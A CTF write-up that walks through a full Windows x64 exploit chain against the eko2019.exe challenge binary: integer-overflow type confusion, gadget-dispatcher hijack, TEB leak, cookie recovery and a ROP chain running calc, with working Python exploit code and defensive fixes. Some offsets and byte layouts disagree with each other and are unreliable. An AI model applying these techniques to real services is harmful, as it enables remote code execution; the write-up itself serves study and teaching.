---
title: "BFS 2019 — Master Exploitation: A Full Chain on eko2019.exe"
subtitle: "Integer overflow → 16-bit type confusion → gadget-dispatcher hijack → TEB leak → ROP → process continuation"
author: Utku Erol
date: "2026-05-14"
keywords: [CTF, BFS2019, eko2019, exploit development, Windows x64, ASLR bypass, TEB leak, stack cookie, ROP, COP, process continuation]
---

# BFS 2019 — Master Exploitation
## A Full Chain on eko2019.exe

---

## Author's Note

This is the writeup that, for me, is not interchangeable with the
others. I wrote the original notes for *Blue Frost Security 2019
— eko2019.exe* during the time I was reading the heap_master
flags, lurking on Corelan's stack/heap forum, and trying to
understand what separated "a CTF I solved" from "a CTF that
*changed how I think*". This was the one. The challenge is small —
one binary, one TCP service, a handful of gadgets — and the
public solution by Connor McGarr [McGarr 2019] is widely cited.
What stayed with me was not the chain itself but the *shape* of
the reasoning it forced.

> *Normal CTF mindset:*  &nbsp;`A → B → C → exploit`
>
> *This challenge:*  &nbsp;`A` branches into `F` which loops
> back to `A`, while `C → E → B → G` converges from another side
> into the same `exploit`.

Linear reasoning would not have produced the chain. The
challenge rewards what I have learned to call *multidimensional
reasoning* — keeping several layered models alive simultaneously
(the signed-integer logical layer; the 16-bit physical layer;
the gadget-dispatcher dynamic-patching layer; the
TEB/PEB/ImageBase address-hierarchy layer; the stack-cookie
restoration layer) and letting them collide productively.

The writeup that follows is the technical autopsy of that
collision. The personal claim is at the front because the
collection is not a list of equivalent items: this one taught me
how to read the rest.

---

## Abstract

This writeup documents a full end-to-end exploit chain against
`eko2019.exe`, the binary used in the Blue Frost Security 2019
exploitation challenge [BFS 2019]. The target is a Windows 10 x64
TCP service on port `54321` with DEP and ASLR enabled and CFG
disabled. The chain combines (i) a signed-integer-then-`movzx`
type-confusion bug in the protocol's payload-size handling, (ii)
a buffer overflow that does not need to overwrite the return
address because it can hijack the program's own *dynamic-gadget
dispatcher*, (iii) a TEB leak via a deliberately-planted
`mov rax, gs:[rcx]; ret` gadget that traverses the
TEB → PEB → ImageBase chain to defeat ASLR, (iv) a stack-cookie
recovery via memory-scan-and-XOR, and (v) a ROP chain that calls
`WinExec("calc")` and then restores the original stack so the
service continues to handle subsequent connections. The
contribution of this writeup is not the chain — which is
documented elsewhere — but the *structure* of the chain: each
stage is the manifestation of a single design property of the
target, and reading the chain backwards is a tour of the property
list. The closing section makes that explicit.

**Keywords:** CTF, BFS 2019, eko2019, exploit development,
Windows x64, ASLR bypass, TEB leak, stack cookie, ROP, COP,
process continuation.

---

## 1. The Target

### 1.1 What `eko2019.exe` is

A Windows x64 native TCP service. It listens on
`0.0.0.0:54321`, accepts client connections, and dispatches each
to a `handle_client()` worker:

```
┌──────────────┐       TCP : 54321        ┌──────────────────┐
│   client     │ ───────────────────────▶ │   eko2019.exe    │
│   (attacker) │                          │  (target service) │
└──────────────┘ ◀─────────────────────── └──────────────────┘
```

The binary is publicly distributed by Blue Frost Security
[BFS 2019] for the express purpose of this exercise.

### 1.2 Mitigations

Inspection via Process Explorer reports the mitigation matrix:

| Mitigation | State    | Consequence for the exploit                                   |
|------------|----------|----------------------------------------------------------------|
| DEP        | Enabled  | No injected shellcode in writable pages — ROP is required.    |
| ASLR       | Enabled  | Module load addresses randomized per boot — info leak needed. |
| CFG        | Disabled | Indirect-call targets are not validated — ROP is unimpeded.    |

DEP forces the chain into ROP territory. ASLR forces the
information-leak phase. CFG's absence removes the one mitigation
that would have made the ROP construction itself non-trivial.

### 1.3 The protocol

Each client conversation is two `recv()` calls:

```
┌────── recv 1 ──────┐  ┌───────────── recv 2 ─────────────┐
│   16-byte header   │  │   payload of length size_payload  │
└────────────────────┘  └───────────────────────────────────┘
```

The header structure:

```
Offset  Size  Field         Value
──────  ────  ────────────  ─────────────────────────────
0x00    8     magic         "Eko2019" + 0x00  (LE-packed)
0x08    4     size_payload  0..512 (per spec)
0x0C    4     reserved      ignored
```

The magic is `0x393130326f6b45` ("Eko2019" packed
little-endian). Per the developer's intent, `size_payload` should
be in `[0, 512]`. The spec is enforced by a single
`if (size_payload < 0x201)` test before the `recv()`.

That test is the bug.

---

## 2. The Vulnerability

### 2.1 The signed/unsigned ontology mismatch

The `handle_client` function performs:

```c
/* line 27: signed integer comparison */
if (size_payload < 0x201) {            /* 513 */
    ...
}

/* line 30: 32-bit signed value cast to 16-bit unsigned */
recv(socket, buf, (uint16_t)size_payload, 0);
```

`size_payload` is a `signed int`. The literal `0x201` is also
signed. The comparison is therefore a *signed* comparison. A
value of `0xFFFFFF02` — interpreted as a signed 32-bit integer —
is `-254`, which is less than `0x201`. The check passes.

Then the value is cast to `(uint16_t)` for the `recv()`
parameter. The cast preserves the low sixteen bits:

```
0xFFFFFF02   (32-bit)        →   0xFF02   (16-bit)
                              =   65 282 bytes
```

The function asks `recv` for *up to 65 282 bytes* into a
512-byte buffer. The disassembly of the cast is the giveaway:

```
cmp     dword ptr [rbp+var_20], 201h        ; signed compare
jle     short loc_1400012CA                  ; passes for negative

movzx   eax, word ptr [rbp+var_20]           ; zero-extend low 16 bits
mov     [rsp+38h+arg_0], eax
call    recv                                 ; ← 65 282 bytes welcome
```

The `movzx` is the ontology break. The instruction *forcibly
zeroes the upper 16 bits*. The signedness of the original value
is gone the moment it touches the `recv` argument register.

> *The logical layer says: −254 bytes, no problem.
> The physical layer says: 65 282 bytes, here they come.
> The two layers are no longer synchronized.*

### 2.2 Stack layout: the overflow lands somewhere unusual

The handler's stack frame:

```
   ┌───────────────────────────┐  ← lower addresses
   │  buf[512]                 │  ← recv target
   ├───────────────────────────┤
   │  gadget_idx  (4 bytes,    │
   │              aligned 8)   │  ← attacker-controllable next
   ├───────────────────────────┤
   │  p  (8 bytes, pointer)    │  ← attacker-controllable next
   ├───────────────────────────┤
   │  stack cookie (8 bytes)   │  ← must be preserved or restored
   ├───────────────────────────┤
   │  saved RBP                │
   ├───────────────────────────┤
   │  return address           │  ← main()+0x14a
   └───────────────────────────┘  ← higher addresses
```

The first thing the overflow reaches, after the buffer, is *not*
the cookie. It is `gadget_idx`. The second is `p`. The cookie
sits *behind* these. This stack arrangement is the second design
property of the target that the exploit will lean on — it lets
us hijack control flow without ever touching the cookie or the
return address, by simply *retargeting the program's own
control-flow primitive*.

---

## 3. The Hidden Mechanic: Dynamic Gadget Dispatch

The reason `gadget_idx` and `p` sit on the stack is that
`handle_client` runs each request through a `exec_gadget()`
primitive that the program *patches in place* using
`WriteProcessMemory`:

```c
/* abbreviated, see the binary for the exact form */
gadget_buf = copy_gadget(g_gadget_array[gadget_idx % 256]);

WriteProcessMemory(GetCurrentProcess(),
                   exec_gadget,        /* function start    */
                   gadget_buf,         /* selected gadget   */
                   8,
                   &bytes_written);

result = exec_gadget(p);               /* p → RCX (Win64 ABI) */
send(socket, &result, 8, 0);
```

Three facts make this exploitable:

1. **`g_gadget_array` is 256 entries in a fixed `.data` region.**
   Even with ASLR, the array's offset from the image base is
   deterministic. Once the image base is known (see §4), every
   entry is addressable.

2. **`exec_gadget` is in writable, executable memory** — the
   binary's design assumes this and grants the page the necessary
   permissions on startup. The "hotpatch" is therefore a one-call
   `WriteProcessMemory` away.

3. **`gadget_idx` and `p` are on the stack adjacent to `buf`.**
   The integer-overflow buffer overflow can rewrite both in a
   single payload.

A subtler observation: there is, in practice, only *one* gadget.
The 256-entry array is the *appearance* of a dispatcher; what
actually happens is that whatever 8 bytes the array points to
are copied into `exec_gadget`'s prologue. The "selection" is
just a write of 8 bytes from a known offset. There is no
multiplexer.

> *This is JOP that pretends to be ROP that pretends to be a
> jump table. The control-flow primitive is "patch eight bytes
> into a known location and call it".*

The exploit therefore does not need to find arbitrary ROP gadgets
elsewhere in the binary; the gadget *is loaded for it*, and only
its eight bytes plus the `p` argument are controlled. That is
both the constraint and the gift of the challenge.

---

## 4. ASLR Bypass via the TEB Gadget

### 4.1 The 0x65 gadget — a deliberately planted primitive

A walk of `g_gadget_array` reveals an entry whose 8 bytes
disassemble to:

```
65 48 8b 01 c3 c3 c3 c3      ; mov rax, gs:[rcx] ; ret
```

The `65` byte is the **GS segment-override prefix**. The
instruction reads 8 bytes from `gs:[rcx]` — i.e., from the
thread's TEB at offset `rcx`. This is not a gadget that occurs
accidentally as the suffix of some legitimate instruction. It is
explicitly placed in the array. Whoever designed the binary
*wanted* you to find this.

That is the third design property. The challenge is not "leak
something at all costs"; it is "use the leak primitive the
binary already provides".

### 4.2 The TEB → PEB → ImageBase chain

On Windows x64, `gs:[0x30]` is the per-thread TEB pointer:

```
gs:[0x30]   →   TEB
TEB + 0x60  →   PEB
PEB + 0x10  →   ImageBaseAddress           ← ASLR collapse
```

A single invocation of the 0x65 gadget with `p = 0x30` reads the
TEB. Subsequent calls of the *default* gadget (§5) at `p = TEB +
0x60`, `p = PEB + 0x10`, etc., walk the rest of the chain.

### 4.3 The leak primitive in Python

```python
def leak_teb():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 54321))

    # Header: magic + size_payload (signed −254, unsigned 16-bit = 65 282)
    s.send(b'Eko2019\x00\x10' + b'\x02\xFF\xFF\xFF\xFF\xFF\xFF')

    # Payload:
    #   0x200 bytes of 0x65  → fills the buffer and overwrites
    #                          gadget_idx to point at the TEB gadget
    #   QWORD(0x30)           → overwrites p (→ RCX) with the TEB offset
    s.send(b'\x65' * 0x200 + struct.pack('<Q', 0x30))

    return struct.unpack('<Q', s.recv(8))[0]
```

> *One overflow. One gadget. Full ASLR bypass.*
>
> *The randomized address space falls in the time it takes
> a TCP packet to round-trip.*

---

## 5. Arbitrary Memory Read via the Default Gadget

### 5.1 The 0x3E gadget

The default `g_gadget_array` entry contains:

```
48 8b 01 c3 c3 c3 c3         ; mov rax, [rcx] ; ret
```

This is the canonical read primitive. With the gadget dispatcher
hijacked to select index `0x3E` (often the default) and `p` set
to any addressable memory, the function returns 8 bytes from
that address.

### 5.2 `leak_q` — the universal read

```python
def leak_q(addr):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, 54321))

    s.send(b'Eko2019\x00\x10' + b'\x02\xFF\xFF\xFF\xFF\xFF\xFF')

    # 0x4B is one of the "slide-to-default" bytes; the buffer is
    # filled with it so that gadget_idx lands on the default
    # index (0x3E or equivalent) on this particular build.
    s.send(b'\x4B' * 0x200 + struct.pack('<Q', addr))

    return struct.unpack('<Q', s.recv(8))[0]
```

### 5.3 The information chain

With `leak_teb` and `leak_q`, six addresses fall in sequence:

```
1.  TEB             ← gs:[0x30]
2.  StackLimit      ← leak_q(teb + 0x10)
3.  StackBase       ← leak_q(teb + 0x08)
4.  PEB             ← leak_q(teb + 0x60)
5.  ImageBase       ← leak_q(peb + 0x10)                      [ASLR ✗]
6.  WinExec         ← leak_q(imagebase + IDATA + 0x10)
7.  cookie_xor_key  ← leak_q(imagebase + DATA + 0x240)
```

After this sequence the attacker has:

- a deterministic map of the binary in memory;
- the absolute address of `kernel32!WinExec`;
- the *key* with which the stack cookie is XOR-protected.

The last item is what makes process continuation possible (§6).

---

## 6. Stack Cookie Bypass

### 6.1 Why the cookie has to be recovered, not bypassed

A normal "skip the cookie" exploit would either (a) avoid
overwriting it at all by using a primitive that does not touch
the return address, or (b) overwrite the cookie with a known
value derived from a leak. Here we want both:

- **Avoid touching the cookie** during the overflow itself (the
  gadget hijack lets us do this — §3).
- **Recover the cookie's value** so that, after the ROP chain,
  we can restore the stack to its original form and let
  `handle_client` return cleanly into `main()`.

The second requirement is what `cookie_xor_key` is for. The
cookie is `RSP ^ cookie_xor_key`; from the leaked key and the
leaked cookie, the original `RSP` can be reconstructed.

### 6.2 Finding the cookie on the stack

The cookie is at a fixed offset from the handler's return
address. The return address has a known value (`main()+0x14a` —
known from the leaked image base). A scan of the stack between
`StackLimit` and `StackBase` for the return-address value
locates the cookie three QWORDs higher:

```python
def leak_cookie(addr_lo, addr_hi):
    target_ret = text_addr + OFFS_ORIG_RET     # main()+0x14a
    for addr in range(addr_hi - 8, addr_lo, -8):
        if leak_q(addr) == target_ret:
            return True, leak_q(addr - 3 * 8)
    return False, 0
```

### 6.3 Reconstructing RSP

```python
found, cookie = leak_cookie(stack_low, stack_high)
rsp_addr      = cookie ^ cookie_xor             # the original RSP
```

`rsp_addr` is now the absolute address of the controlled
buffer's location in stack memory. The ROP chain can be
addressed by offsets from it.

---

## 7. The ROP Chain

The chain has five jobs:

1. **Pivot.** Move `RSP` into the controlled buffer.
2. **Call.** Invoke `WinExec("calc", SW_SHOWNORMAL)`.
3. **Clean.** Repair the stack after `WinExec` returns.
4. **Restore.** Write the original return address back into the
   correct stack slot.
5. **Continue.** Step `RSP` back to where the handler's epilogue
   expects it, so `handle_client` returns cleanly into `main`.

### 7.1 The gadget set (text-segment offsets)

```python
OFFS_POP_R12             = 0x2FBF   # pop r12 ; ret
OFFS_POP_RAX             = 0x0167   # pop rax ; ret
OFFS_POP_RBX             = 0x06F9   # pop rbx ; ret
OFFS_POP_RSP             = 0x0FD7   # pop rsp ; ret           (pivot)
OFFS_MOV_RCX_RAX_CALL_R12 = 0x5375  # mov rcx, rax ; call r12 (COP)
OFFS_MOV_QW_RBX_RAX      = 0x7302   # mov [rbx], rax ; add rsp,0x20
                                    # pop rbx ; ret           (write)
OFFS_ADD_RSP_28          = 0x01D5   # add rsp, 0x28 ; ret
OFFS_ADD_RSP_50          = 0x75FD   # add rsp, 0x50 ; pop rbp ; ret
```

The most interesting of these is the COP gadget
(`mov rcx, rax ; call r12`). The Win64 ABI passes the first
argument in `RCX`, so to call `WinExec("calc", 1)` we need
"calc" in `RCX`. A pure ROP solution would require a `pop rcx`
gadget, which is rare in user code. The COP gadget gives us the
same effect by transferring `RAX` (which we *can* control with
`pop rax`) into `RCX` and then `call`-ing the function pointer
in `R12`. The `call` pushes a return address; the `r12` target
is itself another `pop rax`, which discards that return address
cleanly.

This is Call-Oriented Programming in miniature [Bletsch et al.
2011]. It substitutes for a `pop rcx` gadget that the binary
doesn't provide.

### 7.2 Chain construction

```python
chain = (
    # ── set up R12 as a sink for the COP-pushed return address ──
    pack(text_addr + OFFS_POP_R12)
  + pack(text_addr + OFFS_POP_RAX)        # discarded after the call

    # ── load "calc\0" pointer into RAX ──
  + pack(text_addr + OFFS_POP_RAX)
  + pack(rsp_addr  + OFFS_CALC)

    # ── RCX ← RAX, then call sinked into R12 → effectively WinExec ──
  + pack(text_addr + OFFS_MOV_RCX_RAX_CALL_R12)
  + pack(winexec)

    # ── stack cleanup after WinExec returns ──
  + pack(text_addr + OFFS_ADD_RSP_28) + b'\x3d' * 0x28

    # ── write the original return address back into its stack slot ──
  + pack(text_addr + OFFS_POP_RAX)
  + pack(text_addr + OFFS_ORIG_RET)
  + pack(text_addr + OFFS_POP_RBX)
  + pack(rsp_addr  + OFFS_RET_ADDR)
  + pack(text_addr + OFFS_MOV_QW_RBX_RAX)
  + b'\x3d' * 0x28

    # ── walk RSP forward to where the epilogue expects it ──
  + pack(text_addr + OFFS_ADD_RSP_50) + b'\x3d' * 0x58
  + pack(text_addr + OFFS_ADD_RSP_50) + b'\x3d' * 0x58
  + pack(text_addr + OFFS_ADD_RSP_50) + b'\x3d' * 0x58
  + pack(text_addr + OFFS_ADD_RSP_50)
)

pivot = (
    pack(text_addr + OFFS_POP_RSP)
  + pack(rsp_addr  + OFFS_ROPCHAIN)
)
```

The chain ends with a sequence of `add rsp, 0x50; pop rbp; ret`
gadgets rather than a single large addition because the
arithmetic must land on a slot that contains a valid return
address, and using shorter strides gives the construction
breathing room.

### 7.3 Why process continuation matters

A CTF that opens calc is solved if you read the rules
narrowly. The challenge explicitly asks for the service to
*continue accepting connections* after the exploit. That means:

- the cookie has to be left in a consistent state;
- the return address has to point at `main()`, not at our chain;
- `RSP` has to land where the epilogue expects.

Process continuation is the third goal of the challenge. It is
the difference between *running code* and *running code without
the operator noticing*. The same discipline applies to real-world
post-exploitation: a payload that crashes the host gets you
caught.

---

## 8. The Final Payload

The end-to-end exploit is the sequence:

```python
teb        = leak_teb()
stack_low  = leak_q(teb + 0x10)
stack_high = leak_q(teb + 0x08)
peb        = leak_q(teb + 0x60)
img_base   = leak_q(peb + 0x10)

text_addr  = img_base + 0x1000
data_addr  = img_base + 0xC000
idata_addr = img_base + 0x9000

winexec    = leak_q(idata_addr + 0x10)
cookie_xor = leak_q(data_addr + 0x240)

ok, cookie = leak_cookie(stack_low, stack_high)
assert ok
rsp_addr   = cookie ^ cookie_xor

chain, pivot = build_chain(text_addr, rsp_addr, winexec)

s = socket.socket(); s.connect((HOST, 54321))
s.send(b'Eko2019\x00\x50' + b'\x02\xFF\xFF\xFF\xFF\xFF\xFF')
s.send(b'calc\x00AAA' + chain
      + b'\x3d' * (0x220 - len(chain) - 8)
      + struct.pack('<Q', cookie)
      + b'\x41' * 16
      + pivot)
```

The buffer layout (relative to the `recv` destination):

```
0x000   "calc\x00AAA"                    (NUL-terminated argv[0])
0x008   chain                            (ROP chain proper)
...     pad ('\x3d')                     (fills to 0x228)
0x228   pivot[0]   pop rsp ; ret         (stack pivot gadget)
0x230   pivot[1]   rsp_addr + ROPCHAIN   (target of pivot)
0x238   cookie                           (restored, byte-for-byte)
0x240   AAAAAAAAAAAAAAAA                 (16-byte non-cookie pad)
0x250   pivot start                      (where epilogue's ret takes us)
```

On a successful run, the operator sees: `calc.exe` open. The
service keeps running. The next `nc 127.0.0.1 54321` is greeted
normally.

---

## 9. Reflections — Why This Challenge Repays Re-reading

Stepping back, every stage of the chain is the consequence of
one specific design property of the target:

| Stage             | Design property exploited                                                          |
|-------------------|-------------------------------------------------------------------------------------|
| §2  overflow      | `int` is signed; `(uint16_t)` cast is unsigned. Two layers, one variable.           |
| §3  hijack        | Stack adjacency of `gadget_idx` and `p`. Overflow does not need to reach the cookie. |
| §4  TEB leak      | A deliberately-planted `gs:`-prefixed gadget. The author left it for you.           |
| §5  arbitrary read | The default gadget already reads via `RCX`. One primitive, full coverage.          |
| §6  cookie recovery | `cookie = RSP ^ key`. Symmetric, therefore reversible.                            |
| §7  COP           | The absence of a `pop rcx` gadget is solved by `mov rcx, rax ; call r12`.           |
| §7  continuation  | Stack alignment is restorable because every interim step preserves enough state.    |

The chain is not a sequence of cleverness applied to an
uncooperative target. It is a *reading* of the target's design.
The author wrote the gadget dispatcher, the GS-prefixed gadget,
the COP gadget, the stack layout, and the cookie key into the
binary. The exploit is the inverse of those choices, performed in
the right order.

That is what I think the challenge actually teaches, and it is
the lesson I have carried into every project in the rest of this
collection. When a defender's mental model and the target's
implementation disagree, the implementation wins. When two
parts of the same program use the same variable under
incompatible interpretations, the exploit is the difference. When
the only way through is a control-flow primitive the target
already provides, the operator's job is to find it and use it
exactly as it was constructed.

---

## 10. Conclusion

The chain succeeded:

- **ASLR bypassed** — TEB → PEB → ImageBase via the 0x65 gadget.
- **ACE achieved** — `WinExec("calc")` via a COP-shaped ROP chain.
- **Process continued** — cookie restored, return address rewritten,
  `RSP` walked back, `main()` resumed.

Techniques used and what each adds to the operator's vocabulary:

1. *Integer-overflow → 16-bit type confusion.* The same bug
   class as several historical CVEs; the lesson is to read
   every comparison in light of the *next* cast.
2. *Dynamic-gadget-dispatcher hijack.* Not a generic technique,
   but the principle — "if the program runs your code for you,
   you only need to choose it" — generalizes to JIT engines,
   plugin architectures, and any system that interprets
   attacker-controlled data as control flow.
3. *TEB/PEB → ImageBase leak.* The canonical Windows ASLR-bypass
   primitive once any read is available.
4. *Stack-cookie recovery via memory scan.* When the
   continuation requirement is in scope, leak-then-restore
   beats overwrite-with-garbage.
5. *Call-Oriented Programming.* COP substitutes for missing ROP
   gadgets at the cost of one register's worth of indirection.
6. *Process continuation.* The mark of a careful exploit, not
   just a working one.

### Defensive takeaways

A defender reading the chain in §9's column form has a short
list of things to fix in the binary, in order of cost-of-fix:

1. Treat `size_payload` as `unsigned int` and bound-check
   correctly. (One-line fix.)
2. Move `gadget_idx` and `p` out of the stack frame (into a
   thread-local or a heap structure), so a buffer overflow
   cannot reach them. (Refactor.)
3. Remove writable-executable pages — `exec_gadget`'s
   hotpatching is the second-order vulnerability and should
   not exist in production. (Architectural change.)
4. Enable CFG. (Configuration.)
5. Enable XFG (Extended CFG) on Windows builds that support it.
   (Configuration, harder on older targets.)

Each of these closes a stage in §9. The first one alone breaks
the chain.

---

## References

[BFS 2019] Blue Frost Security. *Exploitation Challenge 2019.*
  GitHub: https://github.com/patois/BFS2019. Accessed 2026.

[McGarr 2019] McGarr, C. *Blue Frost Security 2019 — eko2019.exe
  writeup.* https://connormcgarr.github.io/eko2019-exe/, 2019.

[Bletsch et al. 2011] Bletsch, T., Jiang, X., Freeh, V., Liang,
  Z. *Jump-Oriented Programming: A New Class of Code-Reuse Attack.*
  ASIACCS, 2011. (Foundational reference for call-oriented and
  jump-oriented programming.)

[Shacham 2007] Shacham, H. *The Geometry of Innocent Flesh on
  the Bone: Return-into-libc without Function Calls (on the
  x86).* ACM CCS, 2007. (The ROP foundational paper.)

[Microsoft TEB] Microsoft Corporation. *TEB Structure.* Windows
  Driver Documentation, 2024.

[Microsoft PEB] Microsoft Corporation. *PEB Structure.* Windows
  Driver Documentation, 2024.

[NTInternals TEB] Undocumented NT Internals. *Thread Environment
  Block.*
  https://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Thread/TEB.html

[NTInternals PEB] Undocumented NT Internals. *Process Environment
  Block.*
  https://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/NT%20Objects/Process/PEB.html

[Russinovich et al. 2017/2022] Russinovich, M., Solomon, D.,
  Ionescu, A., Yosifovich, P., Cohen, S. *Windows Internals, 7th
  Edition.* Microsoft Press. (Authoritative reference for x64
  calling convention, TEB/PEB layout, stack cookies, and
  `__security_check_cookie`.)

[Intel SDM] Intel Corporation. *Intel® 64 and IA-32 Architectures
  Software Developer's Manual.* Vol. 2 (`MOVZX`, segment-override
  prefixes, addressing modes), 2024.

[Capstone] Quynh, N. A. *Capstone: Multi-architecture, multi-platform
  disassembly framework.* https://www.capstone-engine.org, 2014.

---

## Appendix A — Where this writeup fits in this collection

This writeup occupies a unique slot in this collection. The other
writeups are conceptual (Mathematical Collapse, Speculation
Barrier Illusion, ETW Mirage, ACMM) and the engineering
projects (SILM, KRzr, KSIF, StealthL4Guard, …) are defensive
tools. This one is *hands-on offensive exploitation* — the
single piece that demonstrates I can build a chain end-to-end
against a real target, not only theorize about why such chains
exist.

The chain itself uses three concepts that show up theoretically
elsewhere in this collection:

- the **trust-boundary collapse** — between the signed and the
  unsigned interpretation of `size_payload` — is the same
  pattern Speculation Barrier Illusion describes between ISA-
  and microarchitectural speculation, and ETW Mirage describes
  between debugging and security telemetry. The bug is in the
  *gap between two readings of the same artifact*. This
  writeup gives one concrete, exploited instance.

- the **gadget-dispatcher hijack** is what Mathematical Collapse
  §V predicts: an attacker treats the binary's own control-flow
  primitive as a DSL it never intended to expose. The binary
  built a 256-entry table; the attacker built a 256-entry attack
  surface from the same bytes.

- the **process-continuation discipline** is the same engineering
  posture that the StealthL4Guard pipeline argues for from the
  defensive side — every layer must leave the system in a usable
  state for the next request. The offensive version is "don't
  crash the service after you exploit it"; the defensive version
  is "don't fingerprint your filter by emitting RST". Same
  invariant, opposite vantage.

The biographical claim in the Author's Note is therefore not
ornamental. This challenge is where the *reading discipline* that
the rest of this collection applies first crystallized for me.

---

*This writeup is a re-reading of a CTF I solved several years
ago. The intent is not to celebrate the solution, but to make
visible the design properties of the target that made the
solution available. — With gratitude to Blue Frost Security
and to Connor McGarr, whose public writeup was the first one I
read end-to-end.*
